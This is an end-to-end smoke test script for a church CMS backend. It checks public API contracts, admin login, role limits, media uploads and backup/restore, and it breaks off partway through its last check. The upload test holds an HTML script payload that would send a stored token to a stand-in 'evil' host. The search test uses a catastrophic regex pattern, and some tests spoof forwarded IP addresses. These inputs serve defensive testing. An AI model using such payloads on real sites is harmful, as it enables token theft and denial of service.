/* eslint-disable no-console */
/**
 * End-to-end smoke test against a real (in-memory) MongoDB.
 *
 *   npm run build && node scripts/smoke-test.js     (from backend/)
 *
 * Boots the compiled app, runs the seed logic via the API where possible,
 * and exercises the public Website contract + admin auth flow.
 */
const assert = require("node:assert");
const { MongoMemoryServer } = require("mongodb-memory-server");

const PORT = 4123;
const BASE = `http://127.0.0.1:${PORT}/v1`;

/** A genuine 1×1 PNG, for asserting that real images still get through. */
function sharpPixel() {
  return require("sharp")({
    create: { width: 1, height: 1, channels: 3, background: "#a81b5e" },
  })
    .png()
    .toBuffer();
}

async function json(response) {
  const text = await response.text();
  try {
    return JSON.parse(text);
  } catch {
    return text;
  }
}

async function main() {
  const mongo = await MongoMemoryServer.create();
  process.env.MONGODB_URI = mongo.getUri("csistmc-portal");
  process.env.PORT = String(PORT);
  process.env.PUBLIC_URL = `http://127.0.0.1:${PORT}`;
  process.env.JWT_ACCESS_SECRET = "smoke-access";
  process.env.JWT_REFRESH_SECRET = "smoke-refresh";
  /*
   * Mirrors a deployment behind a reverse proxy — the container's own router is
   * one — so `req.ip` comes from `X-Forwarded-For`. That is what the rate
   * limiter buckets by, and the checks below rely on it to get a bucket of
   * their own instead of fighting over the shared one.
   */
  process.env.TRUST_PROXY = "true";
  process.env.SEED_ADMIN_EMAIL = "admin@example.org";
  process.env.SEED_ADMIN_PASSWORD = "Password@123";
  // The demo event and announcement are opt-in, so a real installation never
  // gets invented content on its public site. This throwaway in-memory database
  // is the case they exist for: the list-page checks below assert on them.
  process.env.SEED_DEMO_CONTENT = "true";

  // Seed first (uses the same AppModule context).
  require("../dist/seed/seed");
  // seed.ts runs async top-level; wait for it to finish by polling users count
  await new Promise((resolve) => setTimeout(resolve, 8000));

  const { NestFactory } = require("@nestjs/core");
  const { AppModule } = require("../dist/app.module");
  const { configureApp } = require("../dist/configure-app");

  // Same configuration as production, so the test cannot pass against an app
  // that differs from the one that ships.
  const app = await NestFactory.create(AppModule, { logger: ["error", "warn"] });
  configureApp(app);
  await app.listen(PORT, "0.0.0.0");

  let failures = 0;
  const check = async (name, fn) => {
    try {
      await fn();
      console.log(`  ✓ ${name}`);
    } catch (error) {
      failures += 1;
      console.error(`  ✗ ${name}: ${error.message}`);
    }
  };

  console.log("Public contract endpoints:");
  await check("GET /events returns published array", async () => {
    const res = await fetch(`${BASE}/events`);
    assert.equal(res.status, 200);
    const body = await json(res);
    assert(Array.isArray(body), "expected a plain array");
    assert(body.length >= 1, "expected seeded event");
    assert(body[0].title.en, "expected localized title");
    assert(body[0].slug, "expected slug");
    assert(body[0].id, "expected id");
    assert.equal(body[0].status, undefined, "public shape must omit status");
  });

  await check("GET /events?page=1 returns Paginated envelope", async () => {
    const body = await json(await fetch(`${BASE}/events?page=1&pageSize=5`));
    assert(Array.isArray(body.items), "expected items[]");
    assert.equal(body.page, 1);
    assert.equal(typeof body.total, "number");
    assert.equal(typeof body.hasMore, "boolean");
  });

  await check("GET /events/slugs returns string[]", async () => {
    const body = await json(await fetch(`${BASE}/events/slugs`));
    assert(Array.isArray(body) && typeof body[0] === "string");
  });

  await check("GET /events/:slug returns event, 404 on missing", async () => {
    const slugs = await json(await fetch(`${BASE}/events/slugs`));
    const one = await fetch(`${BASE}/events/${slugs[0]}`);
    assert.equal(one.status, 200);
    const missing = await fetch(`${BASE}/events/does-not-exist`);
    assert.equal(missing.status, 404);
  });

  await check("GET /blog returns array", async () => {
    const body = await json(await fetch(`${BASE}/blog`));
    assert(Array.isArray(body));
  });

  /*
   * The two filters `WebsiteRT/src/services/blog.service.ts` depends on:
   * `getBlogPostsByEvent` renders "read more about this" on an event page, and
   * `getBlogPostsByFellowship` fills each fellowship's own news list.
   *
   * Worth asserting because the failure is silent and wrong rather than loud:
   * an ignored query parameter returns *every* published post with a 200, so
   * each event page would quietly list the whole blog and nothing would error.
   */
  await check("GET /blog?event= and ?fellowship= actually filter", async () => {
    const posts = await json(await fetch(`${BASE}/blog`));
    const tagged = posts.find((post) => post.eventSlug);
    if (tagged) {
      const scoped = await json(
        await fetch(`${BASE}/blog?event=${encodeURIComponent(tagged.eventSlug)}`),
      );
      assert(Array.isArray(scoped), "must stay a plain array when filtered");
      assert(scoped.length >= 1, "the event's own post should be returned");
      assert(
        scoped.every((post) => post.eventSlug === tagged.eventSlug),
        "?event= let through posts about other events",
      );
    }

    const filed = posts.find((post) => post.fellowshipSlug);
    if (filed) {
      const scoped = await json(
        await fetch(`${BASE}/blog?fellowship=${filed.fellowshipSlug}`),
      );
      assert(
        Array.isArray(scoped) &&
          scoped.every((post) => post.fellowshipSlug === filed.fellowshipSlug),
        "?fellowship= let through other fellowships' posts",
      );
    }

    // A slug nobody used must come back empty, not fall back to everything.
    const none = await json(await fetch(`${BASE}/blog?event=no-such-event-slug`));
    assert.deepEqual(none, [], "an unmatched ?event= returned posts anyway");
  });

  await check("GET /gallery + /gallery/slugs", async () => {
    assert(Array.isArray(await json(await fetch(`${BASE}/gallery`))));
    assert(Array.isArray(await json(await fetch(`${BASE}/gallery/slugs`))));
  });

  await check("GET /church/service-timings has no `language` field", async () => {
    const timings = await json(await fetch(`${BASE}/church/service-timings`));
    assert(Array.isArray(timings) && timings.length > 0, "expected seeded timings");
    for (const timing of timings) {
      assert.equal(
        timing.language,
        undefined,
        "`language` was dropped from ServiceTiming by the Website contract",
      );
      for (const key of ["day", "time", "service", "venue"]) {
        assert(timing[key]?.en !== undefined, `timing.${key} missing`);
      }
    }
  });

  await check("GET /announcements pinned-first", async () => {
    const body = await json(await fetch(`${BASE}/announcements`));
    assert(Array.isArray(body) && body.length >= 1);
    assert.equal(body[0].pinned, true, "seeded pinned announcement first");
  });

  await check("GET /announcements/pinned returns record or null", async () => {
    const res = await fetch(`${BASE}/announcements/pinned`);
    assert.equal(res.status, 200);
    const body = await json(res);
    assert(body === null || body.pinned === true);
  });

  await check("GET /downloads/grouped returns 3 buckets", async () => {
    const body = await json(await fetch(`${BASE}/downloads/grouped`));
    for (const key of ["bulletin", "form", "document"]) {
      assert(Array.isArray(body[key]), `missing bucket ${key}`);
    }
  });

  await check("GET /fellowships sorted by order, 8 seeded", async () => {
    const body = await json(await fetch(`${BASE}/fellowships`));
    assert.equal(body.length, 8);
    const orders = body.map((f) => f.order);
    assert.deepEqual(orders, [...orders].sort((a, b) => a - b));
  });

  await check("GET /fellowships/:slug", async () => {
    const res = await fetch(`${BASE}/fellowships/youth-fellowship`);
    assert.equal(res.status, 200);
    const body = await json(res);
    assert(body.banner.url && body.coordinator.name.en);
  });

  await check("GET /church/* — only the CMS-owned singletons", async () => {
    for (const key of ["service-timings", "pastor-message", "weekly-verse"]) {
      const res = await fetch(`${BASE}/church/${key}`);
      assert.equal(res.status, 200, `GET /church/${key} → ${res.status}`);
    }
    const timings = await json(await fetch(`${BASE}/church/service-timings`));
    assert(Array.isArray(timings) && timings[0].day.en, "timings shape");
    const message = await json(await fetch(`${BASE}/church/pastor-message`));
    assert(message.authorName?.en && Array.isArray(message.body), "pastor message shape");
  });

  await check("Write-once content is not served (hardcoded in Website)", async () => {
    // These are written into the Website itself; the Portal must not expose
    // endpoints for content nobody can edit here.
    for (const path of [
      "/church/profile",
      "/church/history",
      "/church/vision-mission",
      "/church/diocese",
      "/hero-slides",
      "/leadership",
    ]) {
      const res = await fetch(`${BASE}${path}`);
      assert.equal(res.status, 404, `${path} should be gone, got ${res.status}`);
    }
  });

  await check("POST /contact returns { success, messageKey }", async () => {
    const res = await fetch(`${BASE}/contact`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        name: "Smoke Test",
        email: "smoke@example.org",
        subject: "Hello",
        message: "This is a smoke-test message body.",
      }),
    });
    assert.equal(res.status, 200);
    const body = await json(res);
    assert.equal(body.success, true);
    assert.equal(body.messageKey, "success");
  });

  await check("CORS admits same-network origins, refuses the open internet", async () => {
    // A phone or laptop on the LAN must be able to call the API; a random
    // public site must not.
    for (const origin of [
      "http://192.168.1.20:3001",
      "http://10.147.18.1:3001",
      "http://172.20.4.9:3001",
      "http://macbook.local:3001",
      "http://localhost:3001",
    ]) {
      const res = await fetch(`${BASE}/events`, { headers: { Origin: origin } });
      assert.equal(
        res.headers.get("access-control-allow-origin"),
        origin,
        `${origin} should be allowed`,
      );
    }

    const outside = await fetch(`${BASE}/events`, {
      headers: { Origin: "http://evil.example.com" },
    });
    assert.equal(
      outside.headers.get("access-control-allow-origin"),
      null,
      "a public origin must not be reflected",
    );

    // No Origin header at all (curl, server-to-server) must still work.
    const direct = await fetch(`${BASE}/events`);
    assert.equal(direct.status, 200);
  });

  console.log("Auth + admin flow:");
  let tokens;
  await check("POST /auth/login", async () => {
    const res = await fetch(`${BASE}/auth/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: "admin@example.org", password: "Password@123" }),
    });
    assert.equal(res.status, 200);
    tokens = await json(res);
    assert(tokens.accessToken && tokens.refreshToken && tokens.user.role === "super-admin");
  });

  const auth = () => ({ Authorization: `Bearer ${tokens.accessToken}`, "Content-Type": "application/json" });

  await check("GET /admin/events requires auth", async () => {
    assert.equal((await fetch(`${BASE}/admin/events`)).status, 401);
    assert.equal((await fetch(`${BASE}/admin/events`, { headers: auth() })).status, 200);
  });

  let createdId;
  await check("POST /admin/events creates a draft (not public)", async () => {
    const res = await fetch(`${BASE}/admin/events`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({
        title: { en: "Smoke Event", ta: "சோதனை நிகழ்வு" },
        summary: { en: "Summary", ta: "சுருக்கம்" },
        description: [{ en: "Para", ta: "பத்தி" }],
        startDate: new Date(Date.now() + 86400000).toISOString(),
        location: { en: "Hall", ta: "மண்டபம்" },
      }),
    });
    assert.equal(res.status, 201);
    const body = await json(res);
    createdId = body.id;
    assert.equal(body.status, "draft");
    assert.equal(body.slug, "smoke-event");
    const publicSlugs = await json(await fetch(`${BASE}/events/slugs`));
    assert(!publicSlugs.includes("smoke-event"), "draft must not be public");
  });

  await check("PATCH /admin/events/:id/status publishes + audit written", async () => {
    const res = await fetch(`${BASE}/admin/events/${createdId}/status`, {
      method: "PATCH",
      headers: auth(),
      body: JSON.stringify({ status: "published" }),
    });
    assert.equal(res.status, 200);
    const publicSlugs = await json(await fetch(`${BASE}/events/slugs`));
    assert(publicSlugs.includes("smoke-event"), "published event must be public");
    const logs = await json(await fetch(`${BASE}/admin/audit-logs`, { headers: auth() }));
    assert(logs.items.some((l) => l.action === "publish"), "audit publish entry");
    assert(logs.items.some((l) => l.action === "login"), "audit login entry");
  });

  await check(
    "Gallery: shared album appears in every fellowship + video provider inferred",
    async () => {
      const image = {
        url: `${BASE.replace("/v1", "")}/uploads/images/x.jpg`,
        alt: { en: "Poster", ta: "போஸ்டர்" },
        width: 1600,
        height: 900,
      };

      // One album owned by the choir, one churchwide album owned by nobody.
      const owned = await json(
        await fetch(`${BASE}/admin/gallery`, {
          method: "POST",
          headers: auth(),
          body: JSON.stringify({
            title: { en: "Choir Outing", ta: "பாடகர் பயணம்" },
            date: "2026-05-01",
            cover: image,
            fellowshipSlug: "choir",
            status: "published",
          }),
        }),
      );
      const shared = await json(
        await fetch(`${BASE}/admin/gallery`, {
          method: "POST",
          headers: auth(),
          body: JSON.stringify({
            title: { en: "Christmas 2026", ta: "கிறிஸ்துமஸ் 2026" },
            date: "2026-12-25",
            cover: image,
            shared: true,
            status: "published",
          }),
        }),
      );
      assert.equal(shared.shared, true, "shared flag must round-trip");

      // The choir sees both; another fellowship sees only the shared one.
      const choir = await json(await fetch(`${BASE}/gallery?fellowship=choir`));
      const choirSlugs = choir.map((a) => a.slug);
      assert(choirSlugs.includes(owned.slug), "own album missing from its fellowship");
      assert(choirSlugs.includes(shared.slug), "shared album missing from fellowship");

      const youth = await json(await fetch(`${BASE}/gallery?fellowship=youth-fellowship`));
      const youthSlugs = youth.map((a) => a.slug);
      assert(youthSlugs.includes(shared.slug), "shared album must show for every fellowship");
      assert(!youthSlugs.includes(owned.slug), "another fellowship's album leaked");

      // A video item: provider is inferred server-side from the URL.
      await fetch(`${BASE}/admin/gallery/${shared.id}/photos`, {
        method: "POST",
        headers: auth(),
        body: JSON.stringify({
          photos: [
            { image, video: { url: "https://youtu.be/dQw4w9WgXcQ" } },
            { image, video: { url: "https://vimeo.com/12345" } },
            { image, video: { url: "https://cdn.example.org/carols.mp4" } },
            { image },
          ],
        }),
      });
      const album = await json(await fetch(`${BASE}/gallery/${shared.slug}`));
      assert.equal(album.photos.length, 4, "one request should add the whole batch");
      assert.equal(album.photos[0].video.provider, "youtube");
      assert.equal(album.photos[1].video.provider, "vimeo");
      assert.equal(album.photos[2].video.provider, "file");
      assert.equal(album.photos[3].video, undefined, "a plain photo has no video");

      // Every stored link must be one the Website's player can parse.
      const YT_ID = /(?:youtu\.be\/|[?&]v=|\/embed\/|\/shorts\/)([\w-]{11})/;
      assert(YT_ID.test(album.photos[0].video.url), "YouTube url must expose an id");

      // A hosted link with no extractable id would render a dead player.
      const bad = await fetch(`${BASE}/admin/gallery/${shared.id}/photos`, {
        method: "POST",
        headers: auth(),
        body: JSON.stringify({
          photos: [{ image, video: { url: "https://www.youtube.com/results?q=carols" } }],
        }),
      });
      assert.equal(bad.status, 400, `unplayable YouTube link should be rejected, got ${bad.status}`);

      const stillFour = await json(await fetch(`${BASE}/gallery/${shared.slug}`));
      assert.equal(stillFour.photos.length, 4, "a rejected batch must not be partially applied");
    },
  );

  await check(
    "POST /admin/media/video-poster fetches a YouTube thumbnail (needs network)",
    async () => {
      const res = await fetch(`${BASE}/admin/media/video-poster`, {
        method: "POST",
        headers: auth(),
        body: JSON.stringify({ url: "https://youtu.be/jNQXAC9IVRw" }),
      });

      if (res.status === 422) {
        console.log("      (skipped — no outbound network for thumbnails)");
        return;
      }
      assert.equal(res.status, 201, `expected 201, got ${res.status}`);
      const poster = await json(res);
      assert(poster.url && poster.kind === "image", "poster should be a stored image");
      assert(poster.width > 0 && poster.height > 0, "poster needs dimensions");
      assert(poster.thumbnailUrl, "poster should get a thumbnail like any upload");
    },
  );

  await check("Media library accepts a video file upload", async () => {
    // Smallest thing that is unmistakably an mp4: an ftyp box header.
    const mp4 = Buffer.concat([
      Buffer.from([0, 0, 0, 0x20]),
      Buffer.from("ftypisom"),
      Buffer.alloc(4096),
    ]);
    const form = new FormData();
    form.append("file", new Blob([mp4], { type: "video/mp4" }), "carols.mp4");

    const res = await fetch(`${BASE}/admin/media`, {
      method: "POST",
      headers: { Authorization: `Bearer ${tokens.accessToken}` },
      body: form,
    });
    assert.equal(res.status, 201, `video upload → ${res.status}`);
    const item = await json(res);
    assert.equal(item.kind, "video", `expected kind "video", got "${item.kind}"`);
    assert.equal(item.format, "MP4");
    assert(item.url.includes("/videos/"), "videos should be stored separately");
    assert(item.size, "human-readable size computed");

    // And it must be reachable, since the album stores this URL as video.url.
    const fetched = await fetch(item.url);
    assert.equal(fetched.status, 200, `uploaded video not served: ${fetched.status}`);
  });

  await check("Upload cannot smuggle HTML in under an image content-type", async () => {
    /*
     * The stored extension used to come from the client's filename while only
     * the client's content-type was checked, so these two could disagree and
     * the filename won: `payload.html` declared `image/png` landed in
     * `uploads/images/` and was served back as `text/html`. Behind the
     * container's router that is the CMS's own origin, and tokens live in
     * localStorage.
     */
    const form = new FormData();
    const html = "<script>fetch('//evil/'+localStorage.token)</script>";
    form.append(
      "file",
      new Blob([Buffer.from(html)], { type: "image/png" }),
      "payload.html",
    );
    const res = await fetch(`${BASE}/admin/media`, {
      method: "POST",
      headers: { Authorization: `Bearer ${tokens.accessToken}` },
      body: form,
    });
    assert.equal(res.status, 400, `expected 400, got ${res.status}`);

    // And a real image must still land under an extension matching its type,
    // never under the one the caller asked for.
    const pngForm = new FormData();
    const png = await sharpPixel();
    pngForm.append("file", new Blob([png], { type: "image/png" }), "innocent.html");
    const ok = await fetch(`${BASE}/admin/media`, {
      method: "POST",
      headers: { Authorization: `Bearer ${tokens.accessToken}` },
      body: pngForm,
    });
    assert.equal(ok.status, 201, `expected 201, got ${ok.status}`);
    const item = await json(ok);
    assert(item.url.endsWith(".png"), `stored as ${item.url}, expected .png`);
    assert(!item.url.includes(".html"), "the caller's extension reached disk");
  });

  await check("Search terms are matched literally, not as patterns", async () => {
    /*
     * `{ $regex: term }` compiles whatever arrives. Unescaped, `(` is a driver
     * syntax error (a 500 from typing a bracket) and `(a+)+$` is a denial of
     * service any `content.read` holder — including a viewer — could trigger.
     */
    for (const term of ["(", "(a+)+$", "*", "[", "\\"]) {
      const res = await fetch(
        `${BASE}/admin/blog?search=${encodeURIComponent(term)}`,
        { headers: auth() },
      );
      assert.equal(res.status, 200, `search ${JSON.stringify(term)} → ${res.status}`);
      const body = await json(res);
      assert(Array.isArray(body.items), "expected a paginated envelope");
    }
  });

  await check("Media library still refuses genuinely unsupported types", async () => {
    const form = new FormData();
    form.append("file", new Blob([Buffer.from("#!/bin/sh\n")], { type: "application/x-sh" }), "x.sh");
    const res = await fetch(`${BASE}/admin/media`, {
      method: "POST",
      headers: { Authorization: `Bearer ${tokens.accessToken}` },
      body: form,
    });
    assert.equal(res.status, 400, `expected 400, got ${res.status}`);
  });

  await check("Video poster rejects a link with no video id", async () => {
    const res = await fetch(`${BASE}/admin/media/video-poster`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({ url: "https://www.youtube.com/results?q=carols" }),
    });
    assert.equal(res.status, 422, `expected 422, got ${res.status}`);
  });

  await check("PUT /admin/church/weekly-verse updates singleton", async () => {
    const res = await fetch(`${BASE}/admin/church/weekly-verse`, {
      method: "PUT",
      headers: auth(),
      body: JSON.stringify({
        reference: { en: "John 3:16", ta: "யோவான் 3:16" },
        text: { en: "For God so loved the world…", ta: "தேவன் உலகத்தை அன்பு கூர்ந்தார்…" },
        weekOf: "2026-07-20",
      }),
    });
    assert.equal(res.status, 200);
    const verse = await json(await fetch(`${BASE}/church/weekly-verse`));
    assert.equal(verse.reference.en, "John 3:16");
  });

  await check("POST /auth/refresh rotates tokens", async () => {
    const res = await fetch(`${BASE}/auth/refresh`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ refreshToken: tokens.refreshToken }),
    });
    assert.equal(res.status, 200);
    const fresh = await json(res);
    assert(fresh.accessToken && fresh.refreshToken);
    const reuse = await fetch(`${BASE}/auth/refresh`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ refreshToken: tokens.refreshToken }),
    });
    assert.equal(reuse.status, 401, "old refresh token must be rejected after rotation");
    tokens = fresh;
  });

  await check("RBAC: viewer cannot write", async () => {
    await fetch(`${BASE}/admin/users`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({
        name: "View Only",
        email: "viewer@example.org",
        password: "Password@123",
        role: "viewer",
      }),
    });
    const login = await json(
      await fetch(`${BASE}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: "viewer@example.org", password: "Password@123" }),
      }),
    );
    const res = await fetch(`${BASE}/admin/events`, {
      method: "POST",
      headers: { Authorization: `Bearer ${login.accessToken}`, "Content-Type": "application/json" },
      body: JSON.stringify({}),
    });
    assert.equal(res.status, 403, `viewer create → ${res.status}`);
  });

  await check("PATCH null removes an optional field instead of ignoring it", async () => {
    const created = await json(
      await fetch(`${BASE}/admin/blog`, {
        method: "POST",
        headers: auth(),
        body: JSON.stringify({
          title: { en: "Clearing test", ta: "…" },
          excerpt: { en: "Has a cover to begin with.", ta: "…" },
          body: [{ en: "One paragraph.", ta: "…" }],
          publishedAt: "2026-08-01",
          author: { en: "Church Office", ta: "…" },
          coverImage: {
            url: `http://127.0.0.1:${PORT}/uploads/images/cover.jpg`,
            alt: { en: "A cover", ta: "…" },
            width: 1200,
            height: 800,
          },
          fellowshipSlug: "choir",
        }),
      }),
    );
    assert(created.coverImage?.url, "the post should start with a cover image");
    assert.equal(created.fellowshipSlug, "choir");

    /*
     * Omitting a key means "leave it alone", so removal has to be said out
     * loud. Before this, the CMS omitted the key and a cleared cover image
     * saved successfully without changing anything.
     */
    const patched = await json(
      await fetch(`${BASE}/admin/blog/${created.id}`, {
        method: "PATCH",
        headers: auth(),
        body: JSON.stringify({ coverImage: null, fellowshipSlug: null }),
      }),
    );
    assert.equal(patched.coverImage, undefined, "coverImage must be gone, not null");
    assert.equal(patched.fellowshipSlug, undefined, "fellowshipSlug must be gone");

    // …and stay gone once re-read, rather than only looking gone in the reply.
    const reread = await json(
      await fetch(`${BASE}/admin/blog/${created.id}`, { headers: auth() }),
    );
    assert.equal(reread.coverImage, undefined, "coverImage came back on re-read");

    // An omitted key must still mean "leave alone" — the other half of the
    // contract, and the half everything else in the CMS relies on.
    const untouched = await json(
      await fetch(`${BASE}/admin/blog/${created.id}`, {
        method: "PATCH",
        headers: auth(),
        body: JSON.stringify({ excerpt: { en: "Edited.", ta: "…" } }),
      }),
    );
    assert.equal(untouched.title.en, "Clearing test", "an omitted title must survive");
    assert.equal(untouched.excerpt.en, "Edited.");

    await fetch(`${BASE}/admin/blog/${created.id}`, { method: "DELETE", headers: auth() });
  });

  await check("Contact inbox searches sender, subject and body", async () => {
    await fetch(`${BASE}/contact`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        name: "Anbu Selvam",
        email: "anbu@example.org",
        subject: "Baptism enquiry",
        message: "We would like to ask about arranging a baptism.",
      }),
    });

    const bySender = await json(
      await fetch(`${BASE}/admin/contact-messages?search=anbu`, { headers: auth() }),
    );
    assert.equal(bySender.total, 1, "search must match the sender's name");

    // The body is searched too — people hunt for a half-remembered phrase.
    const byBody = await json(
      await fetch(`${BASE}/admin/contact-messages?search=arranging`, { headers: auth() }),
    );
    assert.equal(byBody.total, 1, "search must reach into the message body");

    /*
     * A regex metacharacter must be treated as text. Unescaped, `(` is a
     * syntax error the driver raises — a 500 from typing a bracket into a
     * search box.
     */
    const res = await fetch(`${BASE}/admin/contact-messages?search=${encodeURIComponent("a(b")}`, {
      headers: auth(),
    });
    assert.equal(res.status, 200, `metacharacter search → ${res.status}`);
    assert.equal((await json(res)).total, 0, "a literal 'a(b' matches nothing");
  });

  /*
   * Backup and restore is the one place in the CMS where a mistake destroys
   * data, so it is exercised end to end rather than endpoint by endpoint: take
   * a real archive, change the database, restore, and assert the change is
   * gone. Anything less would pass on a restore that quietly writes nothing.
   *
   * Runs last because a `replace` restore rolls the whole database — including
   * `users` — back to the moment the archive was taken, which would pull the
   * ground out from under every check above it.
   */
  console.log("\nBackup & restore:");

  let ticket;
  let archive;

  await check("GET /admin/backup/preview counts the whole installation", async () => {
    const body = await json(await fetch(`${BASE}/admin/backup/preview`, { headers: auth() }));
    assert(body.collections.events >= 1, "expected the events collection");
    assert(body.collections.users >= 1, "expected the users collection");
    assert(body.documents > 0, "expected a document total");
    assert.equal(typeof body.estimatedSize, "string");
  });

  await check("POST /admin/backup archives every collection and the media", async () => {
    const res = await fetch(`${BASE}/admin/backup`, { method: "POST", headers: auth() });
    assert.equal(res.status, 201, `expected 201, got ${res.status}`);
    ticket = await json(res);
    assert.equal(ticket.manifest.format, "csistmc-portal-backup");
    assert(ticket.manifest.collections.events >= 1, "events must be in the manifest");
    assert(ticket.manifest.collections.users >= 1, "users must be in the manifest");
    assert(ticket.manifest.uploads.files >= 1, "the uploaded video must be carried");
    assert(ticket.sizeBytes > 0 && ticket.size, "expected a sized archive");
  });

  await check("the archive downloads on its token, and only on its token", async () => {
    // Unauthenticated on purpose — a browser download cannot send a Bearer
    // header. The token in the path is what stands in for it.
    const res = await fetch(`${BASE}${ticket.downloadPath}`);
    assert.equal(res.status, 200, `expected 200, got ${res.status}`);
    assert.equal(res.headers.get("content-type"), "application/zip");
    archive = Buffer.from(await res.arrayBuffer());
    assert.equal(archive.length, ticket.sizeBytes, "Content-Length must match the archive");
    assert.equal(archive.subarray(0, 2).toString(), "PK", "expected a zip");

    const wrong = await fetch(`${BASE}/admin/backup/${ticket.id}/download?token=not-the-token`);
    assert.equal(wrong.status, 404, `wrong token → ${wrong.status}`);
  });

  // A record that exists *after* the archive was taken. A working `replace`
  // restore must remove it; a restore that silently no-ops would leave it.
  let markerId;
  await check("staging an upload reports the manifest and writes nothing", async () => {
    const created = await json(
      await fetch(`${BASE}/admin/announcements`, {
        method: "POST",
        headers: auth(),
        body: JSON.stringify({
          title: { en: "Written after the backup", ta: "காப்புப்பிரதிக்குப் பிறகு" },
          body: { en: "Should not survive a replace restore.", ta: "…" },
          publishedAt: "2026-08-08",
        }),
      }),
    );
    markerId = created.id;
    assert(markerId, "expected the marker announcement to be created");

    const form = new FormData();
    form.append("file", new Blob([archive], { type: "application/zip" }), "backup.zip");
    const res = await fetch(`${BASE}/admin/backup/restore`, {
      method: "POST",
      headers: { Authorization: `Bearer ${tokens.accessToken}` },
      body: form,
    });
    assert.equal(res.status, 200, `expected 200, got ${res.status}`);
    const staged = await json(res);
    assert(staged.id, "expected a staging id");
    assert.equal(staged.manifest.capturedAt, ticket.manifest.capturedAt);
    assert(
      staged.warnings.some((w) => w.includes("Admin accounts")),
      "restoring users must be called out in the warnings",
    );

    // Nothing applied yet.
    const still = await fetch(`${BASE}/admin/announcements/${markerId}`, { headers: auth() });
    assert.equal(still.status, 200, "staging must not touch the database");
    ticket.stagedId = staged.id;
  });

  await check("a replace restore rolls the database back to the archive", async () => {
    const res = await fetch(`${BASE}/admin/backup/restore/${ticket.stagedId}`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({ mode: "replace", safetyBackup: true }),
    });
    assert.equal(res.status, 200, `expected 200, got ${res.status}`);
    const result = await json(res);
    assert.equal(result.mode, "replace");
    assert(result.documents > 0, "expected documents restored");
    assert.equal(result.usersReplaced, true, "the users collection was in the archive");
    assert(result.safetyBackup?.downloadPath, "a safety backup must be offered back");

    const gone = await fetch(`${BASE}/admin/announcements/${markerId}`, { headers: auth() });
    assert.equal(gone.status, 404, `marker survived the restore → ${gone.status}`);

    // …and the content that was in the archive is back, addressable as before:
    // `_id` is preserved, so the seeded event keeps its slug and its links.
    const events = await json(await fetch(`${BASE}/events`));
    assert(events.length >= 1, "restored events must be served again");

    // The safety backup's link still works even though `users` was rewritten —
    // its token is not tied to the session that asked for it.
    const rollback = await fetch(`${BASE}${result.safetyBackup.downloadPath}`);
    assert.equal(rollback.status, 200, `safety backup unreachable → ${rollback.status}`);
  });

  await check("restore refuses a file that is not a Portal backup", async () => {
    const form = new FormData();
    form.append("file", new Blob([Buffer.from("not a zip")], { type: "application/zip" }), "x.zip");
    const res = await fetch(`${BASE}/admin/backup/restore`, {
      method: "POST",
      headers: { Authorization: `Bearer ${tokens.accessToken}` },
      body: form,
    });
    assert.equal(res.status, 400, `expected 400, got ${res.status}`);
  });

  await check("RBAC: not even an admin may back up or restore", async () => {
    await fetch(`${BASE}/admin/users`, {
      method: "POST",
      headers: auth(),
      body: JSON.stringify({
        name: "Ordinary Admin",
        email: "admin2@example.org",
        password: "Password@123",
        role: "admin",
      }),
    });
    const login = await json(
      await fetch(`${BASE}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email: "admin2@example.org", password: "Password@123" }),
      }),
    );
    const asAdmin = {
      Authorization: `Bearer ${login.accessToken}`,
      "Content-Type": "application/json",
    };

    // Both halves are super-admin only. The archive is the whole database in
    // one file — an admin who can download it has every password hash in the
    // installation, whether or not they can put one back.
    const preview = await fetch(`${BASE}/admin/backup/preview`, { headers: asAdmin });
    assert.equal(preview.status, 403, `admin preview → ${preview.status}`);

    const build = await fetch(`${BASE}/admin/backup`, { method: "POST", headers: asAdmin });
    assert.equal(build.status, 403, `admin backup → ${build.status}`);

    const form = new FormData();
    form.append("file", new Blob([archive], { type: "application/zip" }), "backup.zip");
    const restore = await fetch(`${BASE}/admin/backup/restore`, {
      method: "POST",
      headers: { Authorization: `Bearer ${login.accessToken}` },
      body: form,
    });
    assert.equal(restore.status, 403, `admin restore → ${restore.status}`);
  });

  await check("Sign-in throttling is per client, not one bucket for everyone", async () => {
    /*
     * `trust proxy` was unset, so behind the container's router every request in
     * the world arrived as the same address and shared one 5/min bucket: a
     * single attacker could lock every administrator out of sign-in, and every
     * audit entry recorded the proxy instead of a person.
     */
    const login = (ip) =>
      fetch(`${BASE}/auth/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json", "X-Forwarded-For": ip },
        body: JSON.stringify({ email: "admin@example.org", password: "wrong-password" }),
      });

    let throttled = false;
    for (let i = 0; i < 8; i += 1) {
      if ((await login("198.51.100.7")).status === 429) throttled = true;
    }
    assert(throttled, "repeated failures from one address were never throttled");

    // A different client must be unaffected by that one's exhausted budget.
    const other = await login("198.51.100.8");
    assert.equal(
      other.status,
      401,
      `a second client inherited the first's rate limit (${other.status})`,
    );
  });

  /*
   * Deliberately the last check in the suite.
   *
   * Sign-in is rate limited to 5 attempts a minute, and this spends several of
   * them on purpose. Run anywhere earlier it starves the logins the RBAC checks
   * need, and those fail with a confusing 401 — no token, because the login that
   * should have issued one was throttled.
   */
  await check("Sign-in takes the same time for unknown and known addresses", async () => {
    // Each attempt from its own address, so the shared sign-in bucket is left
    // alone and a rate limit can never be mistaken for a slow hash.
    let host = 0;
    const attempt = async (email) => {
      host += 1;
      const started = process.hrtime.bigint();
      const res = await fetch(`${BASE}/auth/login`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-Forwarded-For": `203.0.113.${host}`,
        },
        body: JSON.stringify({ email, password: "definitely-not-the-password" }),
      });
      assert.equal(res.status, 401, `expected a rejected sign-in, got ${res.status}`);
      return Number(process.hrtime.bigint() - started) / 1e6;
    };

